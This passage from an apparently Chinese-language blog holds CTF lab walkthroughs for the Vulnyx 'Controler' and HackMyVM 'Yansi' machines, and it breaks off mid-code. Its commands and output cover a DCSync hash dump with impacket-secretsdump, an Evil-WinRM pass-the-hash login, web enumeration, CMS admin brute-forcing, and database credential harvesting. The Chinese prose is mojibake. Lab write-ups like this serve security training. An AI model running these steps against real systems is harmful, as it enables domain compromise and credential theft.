endpoint<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; <br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°userflagã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; dir<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; cd ..<br>*Evil-WinRM* PS C:\Users\j.levy&gt; cd Desktop<br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; dir<br><br><br>    Directory: C:\Users\j.levy\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       10/22/2024   2:40 PM             70 user.txt<br><br><br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; cat user.txt<br>587c4dac7a29c5c2a2d98732116e5bee<br>*Evil-WinRM* PS C:\Users\j.levy\Desktop&gt; <br><br></code></pre></td></tr></table></figure><h3 id="GetAdmin"><a href="#GetAdmin" class="headerlink" title="GetAdmin"></a>GetAdmin</h3><hr><p>ç”¨bloodhoundåˆ†æåŸŸï¼Œä¸Šä¼ sharphoundã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; upload /home/kali/Desktop/SharpHound.exe<br>                                        <br>Info: Uploading /home/kali/Desktop/SharpHound.exe to C:\Users\j.levy\Documents\SharpHound.exe<br>                                        <br>Data: 1715540 bytes of 1715540 bytes copied<br>                                        <br>Info: Upload successful!<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs shell">*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; .\SharpHound.exe -c All -d control.nyx<br>2025-06-11T17:40:46.0437737-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound<br>2025-06-11T17:40:46.1687827-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry<br>2025-06-11T17:40:46.1687827-07:00|INFORMATION|Initializing SharpHound at 5:40 PM on 6/11/2025<br>2025-06-11T17:40:46.3583738-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry<br>2025-06-11T17:40:46.3867934-07:00|INFORMATION|Beginning LDAP search for control.nyx<br>2025-06-11T17:40:46.4974100-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|Beginning LDAP search for control.nyx Configuration NC<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|Producer has finished, closing LDAP channel<br>2025-06-11T17:40:46.5902495-07:00|INFORMATION|LDAP channel closed, waiting for consumers<br>2025-06-11T17:40:46.7156535-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:46.9349151-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CONTROL.NYX<br>2025-06-11T17:40:52.4847691-07:00|INFORMATION|Consumers finished, closing output channel<br>2025-06-11T17:40:52.5245244-07:00|INFORMATION|Output channel closed, waiting for output task to complete<br>Closing writers<br>2025-06-11T17:40:52.5968654-07:00|INFORMATION|Status: 298 objects finished (+298 49.66667)/s -- Using 39 MB RAM<br>2025-06-11T17:40:52.5968654-07:00|INFORMATION|Enumeration finished in 00:00:06.1712809<br>2025-06-11T17:40:52.6228715-07:00|INFORMATION|Saving cache with stats: 15 ID to type mappings.<br> 0 name to SID mappings.<br> 1 machine sid mappings.<br> 3 sid to domain mappings.<br> 0 global catalog mappings.<br>2025-06-11T17:40:52.6228715-07:00|INFORMATION|SharpHound Enumeration Completed at 5:40 PM on 6/11/2025! Happy Graphing!<br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; dir<br><br><br>    Directory: C:\Users\j.levy\Documents<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        6/11/2025   5:40 PM          25769 20250611174047_BloodHound.zip<br>-a----        6/11/2025   5:40 PM           1288 MWMwNWZhMWQtNWU5Yi00ZGZhLTgzZDEtMDE5NjRmMmE2NWEw.bin<br>-a----        6/11/2025   5:39 PM        1286656 SharpHound.exe<br><br><br>*Evil-WinRM* PS C:\Users\j.levy\Documents&gt; download 20250611174047_BloodHound.zip<br>                                        <br>Info: Downloading C:\Users\j.levy\Documents\20250611174047_BloodHound.zip to 20250611174047_BloodHound.zip<br>                                        <br>Info: Download successful!<br><br></code></pre></td></tr></table></figure><p><img src="/2025/06/11/Vulnyx-Controler/msedge_mpQzCnreXM.png"></p><p>å¸®æˆ‘ä»¬åˆ†æå‡ºè¿™ä¸ªç”¨æˆ·å¯ä»¥æ‰§è¡ŒDCsyncæ”»å‡»ï¼Œè¿˜è´´å¿ƒçš„å‡†å¤‡å¥½äº†å‘½ä»¤ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">impacket-secretsdump &#x27;control.nyx&#x27;/&#x27;j.levy&#x27;:&#x27;Password1&#x27;@&#x27;192.168.56.117&#x27; -just-dc-user administrator<br>/usr/lib/python3/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  import pkg_resources<br>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies <br><br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:48b20d4f3ea31b7234c92b71c90fbff7:::<br>[*] Kerberos keys grabbed<br>Administrator:aes256-cts-hmac-sha1-96:9a8c983c709e851258912c3b1d71c9b05faf1724f522b4f32e57f7bef3366773<br>Administrator:aes128-cts-hmac-sha1-96:0ca176565c5b47fda5e2ab4f53fbb9d3<br>Administrator:des-cbc-md5:ce9785d980c1a7f8<br>[*] Cleaning up... <br><br></code></pre></td></tr></table></figure><p>æˆåŠŸæŠ“å–åˆ°åŸŸç®¡ç†å‘˜çš„å“ˆå¸Œï¼Œæœ€åevil-winrmç™»ä¸Šå»å°±è¡Œäº†ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop]<br>â””â”€# evil-winrm -i 192.168.56.117 -u &#x27;administrator&#x27; -H &quot;48b20d4f3ea31b7234c92b71c90fbff7&quot;<br>                                        <br>Evil-WinRM shell v3.7<br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion<br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..<br>*Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir<br><br><br>    Directory: C:\Users\Administrator\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----       10/22/2024   2:41 PM             70 root.txt<br><br><br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt<br>b43e4c1b7df273b73966bc038774bafd<br>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€</tag>
      
      <tag>Vulnyx</tag>
      
      <tag>åŸŸ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Yansi</title>
    <link href="/2025/06/08/HackMyVM-Yansi/"/>
    <url>/2025/06/08/HackMyVM-Yansi/</url>
    
    <content type="html"><![CDATA[<p>æŒºå‹å¥½çš„é¶æœºã€‚</p><p>é¶æœºipï¼š192.168.56.116</p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><hr><p>nmapï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -T4 -A -v 192.168.56.116 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-08 10:14 EDT<br>NSE: Loaded 156 scripts for scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating ARP Ping Scan at 10:14<br>Scanning 192.168.56.116 [1 port]<br>Completed ARP Ping Scan at 10:14, 0.05s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 10:14<br>Completed Parallel DNS resolution of 1 host. at 10:14, 0.00s elapsed<br>Initiating SYN Stealth Scan at 10:14<br>Scanning 192.168.56.116 [1000 ports]<br>Discovered open port 80/tcp on 192.168.56.116<br>Discovered open port 22/tcp on 192.168.56.116<br>Completed SYN Stealth Scan at 10:14, 0.07s elapsed (1000 total ports)<br>Initiating Service scan at 10:14<br>Scanning 2 services on 192.168.56.116<br>Completed Service scan at 10:14, 6.06s elapsed (2 services on 1 host)<br>Initiating OS detection (try #1) against 192.168.56.116<br>NSE: Script scanning 192.168.56.116.<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.18s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.01s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Nmap scan report for 192.168.56.116<br>Host is up (0.00075s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: CMS Portal<br>| http-methods: <br>|_  Supported Methods: OPTIONS HEAD GET POST<br>MAC Address: 08:00:27:0A:3E:91 (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 21.103 days (since Sun May 18 07:46:31 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=254 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.75 ms 192.168.56.116<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Initiating NSE at 10:14<br>Completed NSE at 10:14, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)<br></code></pre></td></tr></table></figure><p>gobusterï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">gobuster dir -u 192.168.56.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,zip<br>===============================================================<br><br>Gobuster v3.6<br><br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br><br>[+] Url:                     http://192.168.56.116<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,zip<br><br>[+] Timeout:                 10s<br>===============================================================<br><br>Starting gobuster in directory enumeration mode<br>===============================================================<br><br>/.php                 (Status: 403) [Size: 279]<br>/.html                (Status: 403) [Size: 279]<br>/index.html           (Status: 200) [Size: 8845]<br>/login.php            (Status: 200) [Size: 8738]<br>/.php                 (Status: 403) [Size: 279]<br>/.html                (Status: 403) [Size: 279]<br>/server-status        (Status: 403) [Size: 279]<br><br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br><br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>dirsearchï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">dirsearch -u 192.168.56.116<br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.<br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           <br> (_||| _) (/_(_|| (_| )                                                                                                                                    <br>                                                                                                                                                           <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460<br><br>Output File: /home/kali/Desktop/reports/_192.168.56.116/_25-06-08_10-25-30.txt<br><br>Target: http://192.168.56.116/<br><br>[10:25:30] Starting:                                                                                                                                       <br>[10:25:30] 403 -  279B  - /.ht_wsr.txt                                      <br>[10:25:30] 403 -  279B  - /.htaccess.orig                                   <br>[10:25:30] 403 -  279B  - /.htaccess.bak1                                   <br>[10:25:30] 403 -  279B  - /.htaccess.sample<br>[10:25:30] 403 -  279B  - /.htaccess.save<br>[10:25:30] 403 -  279B  - /.htaccess_extra                                  <br>[10:25:30] 403 -  279B  - /.htaccess_sc<br>[10:25:30] 403 -  279B  - /.htaccessOLD<br>[10:25:30] 403 -  279B  - /.htaccess_orig<br>[10:25:30] 403 -  279B  - /.htaccessBAK<br>[10:25:30] 403 -  279B  - /.htaccessOLD2                                    <br>[10:25:30] 403 -  279B  - /.htm                                             <br>[10:25:30] 403 -  279B  - /.html                                            <br>[10:25:30] 403 -  279B  - /.htpasswd_test                                   <br>[10:25:30] 403 -  279B  - /.httr-oauth<br>[10:25:30] 403 -  279B  - /.htpasswds<br>[10:25:31] 403 -  279B  - /.php                                             <br>[10:25:43] 200 -    2KB - /login.php                                        <br>[10:25:48] 403 -  279B  - /server-status/                                   <br>[10:25:48] 403 -  279B  - /server-status<br><br></code></pre></td></tr></table></figure><p>æ‰«åˆ°çš„ç«¯å£å’Œç•Œé¢éƒ½å¾ˆå°‘ï¼Œç›´æ¥è®¿é—®ç½‘ç«™ä¸»é¡µã€‚</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_j2kYt0Mvxf.png"></p><p>ç‚¹å‡»å·¦ä¸‹è§’çš„Access Portalå¯ä»¥è·³è½¬åˆ°ä¸€ä¸ªåå°ç®¡ç†ç•Œé¢ï¼Œä¸‹æ–¹æç¤ºæˆ‘ä»¬æ˜¯ç”¨CMS Made Simpleæ­å»ºçš„ï¼Œç‰ˆæœ¬è¿˜æ˜¯æœ€æ–°çš„2.21ã€‚ä¹‹åç‚¹å‡»å³ä¾§çš„chickhereè¿›å…¥ç®¡ç†å‘˜åå°ç™»å½•ã€‚</p><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_BuWVKsOd4o.png"></p><p>æˆ‘ä»¬å†çœ‹ä¹‹å‰çš„é‚£ä¸ªlogin.phpï¼Œå‘ç°å®ƒçš„ç”¨æˆ·åæ˜¯å†™æ­»äº†çš„adminï¼Œå¹¶ä¸”åº•ä¸‹æç¤ºäº†å¯†ç è§„åˆ™ï¼Œå…«ä½æ•°å­—æ··åˆå­—æ¯ã€‚</p><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_p30kq0Apbn.png"></p><p>ï¼ˆè¿™é‡Œå…¶å®å› ä¸ºå®ƒæœ¬èº«å£ä»¤å°±æ˜¯å¼±å£ä»¤æ‰€ä»¥å¾ˆå®¹æ˜“å°±èƒ½éšä¾¿é€‰ä¸ªå­—å…¸çˆ†ç ´å‡ºæ¥ï¼Œhyhå¤§ä½¬è¿˜ç”¨æ­£åˆ™åŒ¹é…äº†rockyouå­—å…¸ï¼Œä¸‹æ¬¡å¦‚æœè®¾è®¡çš„å¤æ‚ç‚¹æˆ‘å°±æ²¡è¿™ä¹ˆç‹—è¿äº†ï¼‰</p><p>çˆ†ç ´ä¸ºadmin123ï¼Œä½†æ˜¯ç™»å½•ä¹‹åä¼šè·³è½¬å›indexã€‚</p><p>æƒ³åˆ°cmsçš„åå°ç®¡ç†ç•Œé¢æ˜¯ä¸æ˜¯ä¹ŸåŒæ ·è¿™ä¸ªå¯†ç ï¼Œä½¿ç”¨admin:admin123ç™»å½•ï¼Œè¿›å…¥åå°ã€‚ï¼ˆå…¶å®è¿™é‡Œç›´æ¥çˆ†ç ´ä¹Ÿå¯ä»¥ï¼Œåæ­£éƒ½æ˜¯å¼±å¯†ç ï¼‰</p><p>ä¹‹åè¿›å…¥æ‰©å±•â€”â€”ç”¨æˆ·å®šä¹‰æ ‡ç­¾æ‰§è¡ŒRCEåå¼¹shellï¼ˆè¿™åº”è¯¥æ˜¯å‡ ä¸ªç‰ˆæœ¬ä»¥å‰çš„äº†ï¼Œæ²¡æƒ³åˆ°ç°åœ¨è¿˜æ²¡ä¿®ï¼‰</p><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_H0yO1WPGdX.png"></p><p><img src="/2025/06/08/HackMyVM-Yansi/vmware_5kb75XrILC.png"></p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Yansi:/var/www/html/cmsms$ cat config.php <br>&lt;?php<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">CMS Made Simple Configuration File</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"></span><br><span class="language-bash"><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;dbms&#x27;</span>] = <span class="hljs-string">&#x27;mysqli&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_hostname&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_password&#x27;</span>] = <span class="hljs-string">&#x27;root123&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_name&#x27;</span>] = <span class="hljs-string">&#x27;Test&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;db_prefix&#x27;</span>] = <span class="hljs-string">&#x27;cms_&#x27;</span>;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">config[<span class="hljs-string">&#x27;timezone&#x27;</span>] = <span class="hljs-string">&#x27;UTC&#x27;</span>;</span><br>?&gt;www-data@Yansi:/var/www/html/cmsms$ <br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹config.phpï¼Œé‡Œé¢æœ‰æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œè¯»å–åˆ°googleç”¨æˆ·çš„å¯†ç ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs mysql">www-data@Yansi:/var/www/html/cmsms$ mysql -uroot -proot123<br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection id is 23781<br>Server version: 10.5.23-MariaDB-0+deb11u1 Debian 11<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><br>MariaDB [(none)]&gt; use Test;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br>MariaDB [Test]&gt; select * from cms_users ;<br>+---------+----------+----------------------------------+--------------+--------------------+-------------+-----------------+--------+---------------------+---------------------+<br>| user_id | username | password                         | admin_access | first_name         | last_name   | email           | active | create_date         | modified_date       |<br>+---------+----------+----------------------------------+--------------+--------------------+-------------+-----------------+--------+---------------------+---------------------+<br>|       1 | admin    | b8411ccfcf8036d818f0e3e5bbcd24de |            1 |                    |             | admin@admin.com |      1 | 2025-06-08 03:52:15 | 2025-06-08 04:26:41 |<br>|       2 | google   | bc7254fff92665852c30b85b9e812836 |            1 | password:google123 | user:google |                 |      1 | 2025-06-08 04:05:12 | 2025-06-08 04:05:12 |<br>|       3 | demo     | 190359934f28f5eaf4cf315802020a87 |            1 |                    |             |                 |      1 | 2025-06-08 04:07:40 | 2025-06-08 04:07:40 |<br>+---------+----------+----------------------------------+--------------+--------------------+-------------+-----------------+--------+---------------------+---------------------+<br>3 rows in set (0.000 sec)<br><br>MariaDB [Test]&gt; <br><br></code></pre></td></tr></table></figure><p>äº‹å®ä¸Šï¼Œç›´æ¥ä»webçš„ç®¡ç†ç•Œé¢ä¸Šå°±èƒ½çœ‹åˆ°äº†ï¼Œèƒ½çœä¸å°‘äº‹ã€‚</p><p><img src="/2025/06/08/HackMyVM-Yansi/msedge_uXOOSaqz37.png"></p><p>sshåˆ°googleç”¨æˆ·ä¸Šæ‹¿åˆ°userflagã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 